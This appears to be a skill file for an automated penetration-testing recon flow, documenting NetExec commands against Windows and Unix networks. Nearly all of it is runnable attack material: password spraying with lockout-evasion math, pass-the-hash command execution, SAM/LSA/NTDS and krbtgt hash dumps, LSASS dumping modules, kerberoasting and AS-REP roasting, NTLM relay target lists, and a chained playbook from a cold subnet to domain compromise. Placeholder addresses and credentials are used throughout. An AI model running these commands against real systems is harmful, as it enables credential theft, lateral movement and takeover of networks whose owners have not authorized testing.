---
name: netexec
description: Credentialed sweep, password spraying, and post-auth enumeration with NetExec (nxc) across SMB/LDAP/WinRM/MSSQL/SSH/FTP/RDP/WMI/VNC/NFS — fingerprint subnets, validate and spray credentials, dump SAM/LSA/NTDS, kerberoast, collect BloodHound, build SMB-relay target lists, and emit rupu-ingestible work units for the recon flow.
license: Proprietary
compatibility: Requires netexec (nxc) >= 1.1 on the operator box; Python 3 for scripts/parse_nxc.py
metadata:
  author: Section9Labs
  tool: netexec
  flow: recon
---

# NetExec (nxc) — credentialed sweep, spray, and post-auth engine

NetExec is the maintained fork of CrackMapExec: one binary that fingerprints,
authenticates, enumerates, executes, and dumps secrets over every major Windows
(and several Unix) network protocol. In the recon flow it is the step that
turns "a list of hosts" plus "zero or more credentials" into: valid accounts,
admin footholds, relay targets, hashes to crack, and BloodHound data.

Everything nxc sees is also written to its local database under `~/.nxc/`
(hosts, shares, creds, admin relationships) — `nxc smb --help` output never
expires; the DB is your running inventory across a whole engagement.

## 1. Core syntax

```
nxc <protocol> <target> -u <user|users.txt> -p <pass|pass.txt> [options]
```

- **target**: single IP, hostname, CIDR (`192.0.2.0/24`), range
  (`192.0.2.10-50`), or a file of targets (one per line). Mix freely:
  `nxc smb 192.0.2.0/24 198.51.100.7 targets.txt`.
- **-u / -p**: single value or file. Multiple `-u a b -p x y` is allowed.
- **Hash auth**: `-H <LM:NT>` or `-H <NT>` (pass-the-hash; works for smb,
  winrm, mssql, wmi, rdp, ldap).
- **Domain vs local**: `-d EXAMPLE` (or `-d example.com`) for domain auth;
  `--local-auth` to authenticate against the host's local SAM instead.
  These are mutually exclusive mindsets — a local Administrator hash sweep is
  `--local-auth`, a domain spray is `-d`.
- **Kerberos**: `-k` (get a TGT with the supplied creds — target must be the
  FQDN, e.g. `dc01.example.com`), `--use-kcache` (use `KRB5CCNAME` ticket —
  pass-the-ticket), `--aesKey <key>` for AES pass-the-key.
- **Output**: add `--log nxc.log` to capture everything for parsing; `--verbose`
  for debugging. Exports (users, hashes) land in `~/.nxc/logs/` and
  `~/.nxc/modules/`.

### The (Pwn3d!) marker

A `[+] EXAMPLE\user:pass (Pwn3d!)` line means the credential gives **admin
code-execution** on that host (local admin over SMB, sysadmin on MSSQL,
pwsh over WinRM, root over SSH). Every Pwn3d host is a lateral-movement and
secrets-dump target: `--sam --lsa`, `-M lsassy`, `-x whoami`, `--ntds` on DCs.

## 2. Protocols — what each is for

| proto | port | use it for |
|---|---|---|
| smb   | 445  | fingerprint, null/guest, shares, users, RID brute, pass-pol, exec (`-x/-X`), SAM/LSA/NTDS, spider, relay list |
| ldap  | 389/636 | domain enum, kerberoast, AS-REP roast, delegation, BloodHound collection |
| winrm | 5985/5986 | PowerShell exec for users in Remote Management Users / admins |
| mssql | 1433 | SQL auth + Windows auth, `-q` queries, xp_cmdshell exec, linked-server abuse |
| ssh   | 22   | Unix spray + exec, key auth (`--key-file`) |
| ftp   | 21   | anonymous check, `--ls`, get/put |
| rdp   | 3389 | cred validation, NLA check, `--screenshot`/`--screentime` |
| wmi   | 135  | exec when SMB exec is blocked (`-x` over DCOM/WMI) |
| vnc   | 5900 | no-auth / password spray, `--screenshot` |
| nfs   | 2049 | `--shares`, `--enum-shares`, mount-free file read/write (`--get-file/--put-file`), uid spoofing |

Full per-protocol flag catalog and post-auth plays: `references/protocols.md`.

## 3. SMB methodology (the backbone)

**Unauthenticated fingerprint of a subnet** — always first:

```
nxc smb 192.0.2.0/24 --log sweep.log
```

Each live host prints OS/build, hostname, domain, `signing:True|False`,
`SMBv1:True|False`. Signing **False** = NTLM-relay target. Build the relay list
directly:

```
nxc smb 192.0.2.0/24 --gen-relay-list relay.txt
```

**Null session and guest** (common on older DCs and misconfigured members):

```
nxc smb 192.0.2.5 -u '' -p ''
nxc smb 192.0.2.5 -u 'guest' -p ''
```

If either returns `[+]`, enumerate everything unauthenticated:

```
nxc smb 192.0.2.5 -u '' -p '' --shares --users --pass-pol --rid-brute 10000
```

**Authenticated enumeration** (works with `-p`, `-H`, or `-k` equally):

```
nxc smb 192.0.2.0/24 -u jdoe -p 'Password1' -d example.com \
    --shares --users --groups --local-groups --loggedon-users --sessions \
    --pass-pol --disks
```

- `--shares` → READ/WRITE per share. WRITE on a share others execute from =
  payload drop; READ on backup/IT shares = creds in files.
- `--rid-brute [max]` → users+groups via SID cycling even when SAMR user enum
  is blocked.
- `--pass-pol` → lockout threshold/window; this drives your spray math.
- `--loggedon-users` / `--sessions` → where admins are sitting (token targets).

**Files and spidering:**

```
nxc smb 192.0.2.17 -u jdoe -p 'Password1' --get-file '\\path\\web.config' ./web.config
nxc smb 192.0.2.17 -u jdoe -p 'Password1' --put-file ./tool.exe '\\Windows\\Temp\\t.exe'
nxc smb 192.0.2.0/24 -u jdoe -p 'Password1' -M spider_plus
nxc smb 192.0.2.17 -u jdoe -p 'Password1' -M spider_plus -o DOWNLOAD_FLAG=true
```

spider_plus writes a JSON inventory of every readable file (and downloads them
with `DOWNLOAD_FLAG=true`) under `~/.nxc/modules/nxc_spider_plus/`.

**Command execution** (requires Pwn3d-level access):

```
nxc smb 192.0.2.17 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -x 'whoami /all'
nxc smb 192.0.2.17 -u Administrator -H <NT> -X '$env:COMPUTERNAME; Get-LocalGroupMember Administrators'
```

`-x` = cmd.exe, `-X` = PowerShell. `--exec-method` can force
`smbexec|wmiexec|atexec|mmcexec` if the default is blocked.

**Secrets:**

```
nxc smb 192.0.2.17 -u Administrator -H <NT> --local-auth --sam --lsa
nxc smb 192.0.2.5  -u domadm -p 'P@ss' -d example.com --ntds          # DC: full domain hash dump (DRSUAPI)
nxc smb 192.0.2.5  -u domadm -p 'P@ss' --ntds --user krbtgt          # single account (golden ticket)
```

`--lsa` yields cached domain creds, service-account plaintext, machine
account hashes. `--ntds` against a DC is the domain-compromise endpoint.
`--dpapi` pulls DPAPI-protected creds (browser/Credential Manager).

## 4. LDAP methodology

Run against DCs (`192.0.2.5` / `dc01.example.com`):

```
nxc ldap 192.0.2.5 -u jdoe -p 'Password1' -d example.com --users --groups
nxc ldap 192.0.2.5 -u jdoe -p 'Password1' --password-not-required --trusted-for-delegation --admin-count
nxc ldap 192.0.2.5 -u jdoe -p 'Password1' --kerberoasting kerb.txt
nxc ldap 192.0.2.5 -u jdoe -p 'Password1' --asreproast asrep.txt
nxc ldap 192.0.2.5 -u '' -p '' --asreproast asrep.txt -u users.txt     # AS-REP roast needs no valid cred, just usernames
```

Crack output: `hashcat -m 13100 kerb.txt` (TGS), `-m 18200 asrep.txt`.

**BloodHound collection** (nxc is a full BloodHound-CE collector):

```
nxc ldap 192.0.2.5 -u jdoe -p 'Password1' -d example.com \
    --bloodhound --collection All --dns-server 192.0.2.5
```

Output zip lands in `~/.nxc/logs/` — ingest into BloodHound CE. Details in
`references/spraying-and-modules.md`.

## 5. Credential validation and spraying

**Spray one password across many users (lockout-safe):**

```
nxc smb 192.0.2.5 -u users.txt -p 'Autumn2024!' -d example.com --continue-on-success
```

`--continue-on-success` keeps going after hits (default stops at first valid).
One password per spray round = exactly 1 bad attempt per account.

**Paired lists** (user[i]:pass[i], no cross-product — e.g. breach-dump reuse):

```
nxc smb 192.0.2.5 -u users.txt -p pass.txt --no-bruteforce --continue-on-success
```

**Lockout math**: read `--pass-pol` first. Threshold T, observation window W →
you may send at most `T-1` passwords per account per window (keep a buffer of
1-2). Threshold 0 = no lockout = brute freely. Full calculus and cadence in
`references/spraying-and-modules.md`.

**Local-admin reuse sweep** (same local hash across a subnet):

```
nxc smb 192.0.2.0/24 -u Administrator -H <NT> --local-auth --continue-on-success
```

Every `(Pwn3d!)` is a foothold. Repeat the same sweep over `winrm`, `mssql`,
`ssh`, `rdp`, `wmi` — different services, different lockout surfaces, and some
accounts only work on some protocols (e.g. Remote Management Users → winrm
only).

## 6. Modules

```
nxc smb -L                      # list modules for a protocol
nxc smb -M lsassy --options     # show a module's options
nxc smb <t> -u u -p p -M lsassy -o KEY=VALUE
```

High-value modules (methodology level; catalog in references):
`spider_plus` (share inventory/loot), `lsassy` / `nanodump` / `handlekatz`
(LSASS creds remotely), `enum_av` (EDR/AV fingerprint before touching LSASS),
`gpp_password` / `gpp_autologin` (SYSVOL creds), `zerologon`, `nopac`,
`petitpotam`, `coerce_plus` (auth coercion → feed the relay), `ms17-010`,
`webdav`, `spooler`, `laps`, `veeam_dump`, `keepass_discover/trigger`,
`ldap-checker`, `adcs` (ESC hunting), `whoami`, `mssql_priv` (mssql),
`get-desc-users` (passwords in AD description fields).

## 7. Protocol-specific post-auth quick hits

```
nxc mssql 192.0.2.30 -u sa -p 'SAPass!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases'
nxc mssql 192.0.2.30 -u sa -p 'SAPass!' --local-auth -x 'whoami'      # auto-enables xp_cmdshell
nxc winrm 192.0.2.0/24 -u jdoe -p 'Password1' -d example.com -x 'whoami'
nxc wmi   192.0.2.17 -u Administrator -H <NT> --local-auth -x 'ipconfig /all'
nxc ssh   198.51.100.0/24 -u root -p pass.txt -x 'id'
nxc rdp   192.0.2.0/24 -u jdoe -p 'Password1' --screenshot
nxc nfs   203.0.113.9 --shares --enum-shares
```

The nxc DB (`~/.nxc/workspaces/default/*.db`) accumulates every host, share,
cred, and admin relationship; query it with `nxcdb` (`nxcdb` → `workspace
default` → `proto smb` → `creds` / `hosts` / `shares`).

## 8. Chained example — cold subnet to domain data

```
# 1. Unauth fingerprint: OS, domain, signing — and a relay list in one pass
nxc smb 192.0.2.0/24 --log sweep.log
nxc smb 192.0.2.0/24 --gen-relay-list relay.txt

# 2. Null session on the DC: users, shares, password policy
nxc smb 192.0.2.5 -u '' -p '' --users --shares --pass-pol --rid-brute 10000 --log null.log

# 3. Parse + build users.txt and work units
python3 scripts/parse_nxc.py sweep.log null.log -o out/        # writes out/users.txt, out/relay_targets.txt, prints work-units JSON

# 4. Spray one candidate password (pass-pol says threshold 5 → safe)
nxc smb 192.0.2.5 -u out/users.txt -p 'Autumn2024!' -d example.com --continue-on-success --log spray.log

# 5. With a hit (EXAMPLE\jdoe): kerberoast + BloodHound on the DC
nxc ldap 192.0.2.5 -u jdoe -p 'Autumn2024!' -d example.com --kerberoasting kerb.txt --asreproast asrep.txt
nxc ldap 192.0.2.5 -u jdoe -p 'Autumn2024!' -d example.com --bloodhound --collection All --dns-server 192.0.2.5

# 6. Where is jdoe admin? Sweep for (Pwn3d!), then dump
nxc smb 192.0.2.0/24 -u jdoe -p 'Autumn2024!' -d example.com --continue-on-success --log admin.log
python3 scripts/parse_nxc.py spray.log admin.log -o out/       # valid_creds.txt + "dump secrets on Pwn3d hosts" units

# 7. relay.txt feeds ntlmrelayx; coerce auth with -M coerce_plus toward the relay
```

## 9. Parsing and rupu handoff

`scripts/parse_nxc.py` ingests nxc console/`--log` output (any mix of files or
stdin) and produces:

- `out/users.txt` — deduped usernames (from `--users`, `--rid-brute`, cred hits)
- `out/valid_creds.txt` — `domain\user:secret [PWNED] @host` lines
- `out/relay_targets.txt` — hosts with `signing:False`
- `out/nxc_parsed.json` — full structured facts (hosts, creds, shares, policy)
- **stdout** — a clean JSON array (first byte `[`) of follow-up work units
  `[{id,title,targets,hints}]`: spray these users, dump SAM/LSA/NTDS on Pwn3d
  hosts, relay to signing-disabled targets, roast via the DC.

**Reporting pack — import by name, do not re-invent:** use `work-units` to
feed the stdout array into a rupu `for_each:` (via `read_file`) or a lead's
`dispatch`; use `coverage-assets` (`assets.mark`) to record every fingerprinted
host, readable share, and validated account as coverage; use `finding-report`
(`findings.report`) for verified issues — null session, SMB signing disabled,
valid sprayed creds, `(Pwn3d!)` admin access, SAM/LSA/NTDS dumps. Details:
`references/rupu.md`.

## References

- `references/protocols.md` — per-protocol flag catalog + post-auth plays
- `references/spraying-and-modules.md` — spray strategy, lockout math, module catalog, BloodHound-CE collection
- `references/rupu.md` — rupu ingestion contract for parse_nxc.py output
